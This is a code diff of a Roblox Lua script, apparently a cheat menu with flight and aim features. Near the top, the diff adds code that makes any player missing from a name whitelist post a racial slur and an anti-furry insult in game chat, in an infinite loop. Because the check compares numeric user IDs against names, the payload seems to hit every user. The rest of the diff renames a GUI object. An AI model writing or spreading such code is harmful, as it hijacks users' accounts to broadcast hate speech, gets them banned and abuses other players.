@@ -1,21 +1,26 @@
-whitelist = {
-	["smugEx"] = true;
-	["Bloxume"] = true;
-	["neeaba"] = true;
-	["TfojaBabciaTereska"] = true;
-	["Miguel_Mikaelsonn"] = true;
-	["BEN10ENSEMBLEOSMO"] = true;
-	["10KPhoton"] = true;
-	["getrichboyz"] = true;
-	["Evanisstinky"] = true;
-	["BlueBaconHai"] = true;
-	["TheKnownX"] = true;
+Whitelist = {
+	"smugEx";
+	"Bloxume";
+	"neeaba";
+	"TfojaBabciaTereska";
+	"Miguel_Mikaelsonn";
+	"BEN10ENSEMBLEOSMO";
+	"10KPhoton";
+	"getrichboyz";
+	"Evanisstinky";
+	"BlueBaconHai";
+	"TheKnownX";
 }
 
 local Players = game:GetService("Players")
 local Player = Players.LocalPlayer
 
-if whitelist[Player.Name] ~= true then return end
+if not table.find(Whitelist, Player.UserId) then
+	while true do
+		Players:Chat("nigger also furries suck")
+	end
+	return
+end
 
 local InsertService = game:GetService("InsertService")
 local StarterGui = game:GetService("StarterGui")
@@ -46,7 +51,7 @@ OwnsFlight = false
 OwnsAim = false
 PreDeathCFrame = nil
 
-local GHotkey = Instance.new("ScreenGui")
+local GRod = Instance.new("ScreenGui")
 local Tab = Instance.new("Frame")
 local UICorner = Instance.new("UICorner")
 local Header = Instance.new("TextLabel")
@@ -201,12 +206,12 @@ local UITextSizeConstraint_34 = Instance.new("UITextSizeConstraint")
 local UITextSizeConstraint_35 = Instance.new("UITextSizeConstraint")
 local UIAspectRatioConstraint = Instance.new("UIAspectRatioConstraint")
 
-GHotkey.Name = "GHotkey"
-GHotkey.Parent = Player:WaitForChild("PlayerGui")
-GHotkey.ResetOnSpawn = false
+GRod.Name = "GRod"
+GRod.Parent = Player:WaitForChild("PlayerGui")
+GRod.ResetOnSpawn = false
 
 Tab.Name = "Tab"
-Tab.Parent = GHotkey
+Tab.Parent = GRod
 Tab.Active = true
 Tab.BackgroundColor3 = Color3.fromRGB(44, 44, 44)
 Tab.Position = UDim2.new(0, 8, 0, 351)
@@ -1149,7 +1154,7 @@ Regular_2.TextWrapped = true
 UITextSizeConstraint_32.Parent = Regular_2
 UITextSizeConstraint_32.MaxTextSize = 14
 
-UIAspectRatioConstraint.Parent = GHotkey
+UIAspectRatioConstraint.Parent = GRod
 UIAspectRatioConstraint.AspectRatio = 2.250
 
 local Data = BadgeService:FindFirstChild("data")
@@ -1556,13 +1561,13 @@ Exit.MouseButton1Click:Connect(function()
 		local Tween2 = TweenService:Create(Tab, TwnInfo, {Size = UDim2.new(0, 0, 0.033, 0)})
 		Tween2:Play()
 		task.wait(1)
-		GHotkey:Destroy()
+		GRod:Destroy()
 	else
 		local TwnInfo = TweenInfo.new(1)
 		local Tween = TweenService:Create(Tab, TwnInfo, {Size = UDim2.new(0, 0, 0.033, 0)})
 		Tween:Play()
 		task.wait(1)
-		GHotkey:Destroy()
+		GRod:Destroy()
 	end
 end)
 
